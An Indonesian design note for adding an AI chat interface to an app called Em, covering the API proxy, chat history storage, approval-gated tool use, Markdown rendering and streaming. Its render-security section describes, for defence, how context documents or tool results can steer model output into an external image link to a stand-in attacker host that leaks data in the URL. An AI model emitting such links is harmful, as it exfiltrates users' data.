# Antarmuka chat AI di Em

- **Tanggal:** 2026-10-03
- **Status:** diskusi (belum ada keputusan final, belum ada plan, belum ada kode)
- **Plan turunan:** belum ada
- **Catatan terkait:** [stream-dua-arah.md](stream-dua-arah.md). Chat adalah konsumen pertama engine stream dua arah; transport, `[StreamAction]`, dan pertanyaan terbukanya dibahas di sana, bukan di sini.

Gagasan membuat antarmuka chat untuk AI (seperti Claude.ai) di dalam Em. Isinya gagasan, bukan perintah kerja; agent tidak boleh mengeksekusinya sebelum dijadikan plan di `plan/unexecuted/`.

## Apakah mungkin

Mungkin, dan cocok dengan arsitektur Em. Chat pada dasarnya memanggil Messages API Anthropic dengan streaming (SSE): riwayat percakapan dikirim ulang tiap giliran, token respons ditampilkan sambil mengalir, dan opsional ada tool use, lampiran gambar/PDF, prompt caching, dan extended thinking. Tidak ada bagian yang mustahil.

## Kecocokan dengan Em

| Kebutuhan chat | Yang sudah ada di Em |
|---|---|
| API key tidak boleh ada di client | `Em.Api` jadi proxy. WPF/MAUI hanya bicara ke server sendiri; key disimpan lewat env/secret manager. |
| Login dan hak akses | Sistem user, claim, dan robot token yang ada. Mis. claim `Chat Access`. |
| Simpan riwayat percakapan | Tabel `ta_` di SQL Server, mengikuti pola scaffold SDK. |
| Lampiran file | Local binary storage atau CDN. |
| Tool berbahaya perlu persetujuan | Engine approval sebagai human-in-the-loop. |
| UI | Layar baru di `Navigations/` dengan style Material bersama. |

Nilai tambah terbesar ada di **tool use**: Claude bisa memanggil service modul Em (cari data, buat dokumen, dan sebagainya) dengan hak akses user yang sedang login, sesuatu yang tidak dimiliki chat generik. Tool yang berisiko lewat engine approval sebelum dijalankan.

## Tingkatan cakupan

- **Dasar:** satu percakapan, streaming, riwayat tersimpan, tombol stop/copy/regenerate.
- **Menengah:** Markdown dan kode yang rapi, lampiran, system prompt per modul, pilihan model.
- **Lanjut:** tool use ke service Em, persetujuan lewat approval, ringkasan konteks otomatis, kuota per user.

Saran: mulai dari tingkat Dasar, karena arsitektur proxy, penyimpanan riwayat, dan streaming sudah menentukan semua hal berikutnya.

## Render hasil (hasil model berupa Markdown)

Claude menjawab dengan CommonMark ditambah ekstensi GitHub (tabel pipa, fenced code dengan tag bahasa, task list, strikethrough). Alur data:

```
token stream (teks MD) -> buffer di C# -> parse dengan Markdig -> render
```

Pipeline Markdig yang dibayangkan: `UseAdvancedExtensions()` dan `DisableHtml()`. Dua keluaran: `Markdown.ToHtml` untuk jalur WebView, atau `Markdown.Parse` (AST) untuk jalur native.

**Simpan Markdown mentah, bukan HTML.** Di database cukup teks asli; HTML atau kontrol dibuat saat tampil, sehingga ganti tema, ganti renderer, atau ekspor tidak perlu migrasi data. Tombol "copy pesan" menyalin Markdown aslinya.

### Tiga pendekatan renderer

| Pendekatan | Kelebihan | Kekurangan |
|---|---|---|
| **Satu WebView2 dengan HTML** (mirip claude.ai) | Fidelitas tertinggi: tabel, kode, rumus (KaTeX), diagram (Mermaid), seleksi teks lintas pesan. Template HTML/CSS bisa dipakai ulang di MAUI (WebView Android), jadi satu renderer untuk dua klien. | Bergantung pada runtime WebView2; masalah airspace (elemen WPF tidak bisa ditumpuk di atasnya); tema terang/gelap harus disinkronkan ke CSS; latar default putih sehingga `DefaultBackgroundColor` harus diset ke warna tema (aturan kilatan putih di `claude.md`); harus satu WebView untuk seluruh percakapan, bukan satu per pesan. |
| **Native: Markdig menjadi blok kontrol** | Tema Material bersama langsung berlaku; tanpa dependensi runtime; kondisi enabled/disabled mudah dikendalikan; tombol copy kecil di kanan header blok kode sesuai standar repo. | Paling banyak pekerjaannya; seleksi teks lintas blok dan pesan canggung; rumus dan diagram praktis tidak ada; perlu library highlighter terpisah; tidak bisa dipakai di MAUI. |
| **`FlowDocument` lewat library jadi** (MdXaml, Markdig.Wpf) | Tercepat jadi; seleksi teks enak. | Tema dan tombol copy per blok sulit dikustom; kinerja buruk untuk riwayat panjang dan update berulang. |

Kecenderungan: **satu WebView dengan template HTML bersama**, karena MAUI juga perlu chat. Native layak hanya bila ingin tampilan benar-benar menyatu dengan Material tanpa dependensi WebView2. Belum diputuskan pengguna.

### Streaming

1. **Throttle:** kumpulkan token dan perbarui UI tiap 30-60 ms, bukan per token.
2. **Parse ulang seluruh teks pesan yang sedang mengalir** tiap tick. Pesan hanya beberapa KB dan Markdig sangat cepat, jadi parser inkremental tidak perlu. WebView: kirim HTML hasilnya, lalu DOM diff di JS (idiomorph/morphdom) agar blok yang tidak berubah tidak berkedip dan seleksi user tidak hilang. Native: bandingkan daftar blok AST dengan yang lama berdasarkan indeks; blok yang sama dipakai ulang, hanya blok ekor yang diperbarui.
3. **Konstruksi yang belum selesai** (pagar kode atau `**` yang belum tertutup) dibiarkan: Markdig menganggap kode terbuka sebagai kode sampai akhir, dan kedipan kecil itu wajar.
4. **Auto-scroll hanya bila posisi sudah di dasar.** Kalau user scroll ke atas, jangan ditarik turun; tampilkan tombol "ke bawah".
5. **Virtualisasi** riwayat panjang. Tinggi item berubah-ubah sehingga mahal; di HTML lebih mudah, di native perlu `VirtualizingStackPanel` dengan hati-hati.

### Elemen Markdown

| Elemen | Catatan |
|---|---|
| Blok kode | Bahasa dari info string (` ```csharp `), highlight (highlight.js di jalur HTML), tombol copy kecil di kanan header blok. |
| Tabel | Scroll horizontal bila lebar agar layout tidak rusak. |
| Link | Hanya `http`, `https`, `mailto`; dibuka di browser sistem, bukan di dalam WebView; URL asli ditampilkan saat hover karena teks link bisa berbeda dari tujuannya. |
| Gambar | Lihat keamanan di bawah. |
| Rumus (`$...$`), diagram (Mermaid) | Hanya praktis di jalur WebView. |

### Keamanan render

Isi Markdown berasal dari model, yang bisa dipengaruhi dokumen atau hasil tool di konteks:

- `DisableHtml()` tetap aktif. Jika memakai WebView, tambahkan Content-Security-Policy di halaman dan batasi navigasi link.
- **Gambar eksternal** (`![x](https://penyerang.com/?data=...)`) otomatis diunduh saat dirender dan bisa membocorkan data lewat URL. Blok gambar eksternal, atau minta konfirmasi user sebelum dimuat.
- System prompt menyebut fitur Markdown yang didukung renderer (mis. tanpa HTML, tabel boleh, tag bahasa wajib di blok kode) untuk mengurangi keluaran yang tidak bisa dirender dengan baik.

## Masalah yang dinilai sulit

1. **Streaming lewat `Em.Api`** dan engine duplex: lihat [stream-dua-arah.md](stream-dua-arah.md).
2. **Render Markdown yang sedang mengalir** (pembahasan di atas).
3. **Konteks panjang:** percakapan lama perlu dipangkas atau diringkas agar tidak melewati batas konteks dan biaya tidak membengkak. Belum dibahas rinci.
4. **Biaya dan kuota:** perlu pencatatan token per user atau batas pemakaian. Belum dibahas rinci.
5. **MAUI:** layar WPF tidak otomatis jalan di sana, karena `Em.Ui.Core.Maui` adalah salinan terpisah (android-only, SPA-only, modul ditunda).

## Pertanyaan yang masih terbuka

1. **Rumus dan diagram termasuk kebutuhan?** Menentukan apakah jalur WebView hampir wajib (ya) atau native cukup (tidak). Belum dijawab pengguna.
2. **Tampilan seperti claude.ai atau native Material?** Belum dijawab pengguna.
3. **Asisten umum, atau asisten yang memakai data modul Em (tool use)?** Menentukan apakah tingkat Lanjut masuk jangkauan awal.
4. **Penyedia model:** dibayangkan memakai Anthropic langsung; abstraksi penyedia model-agnostik belum dibahas.
5. **Pustaka .NET untuk memanggil API Anthropic:** belum diperiksa mana yang dipakai dan versinya.
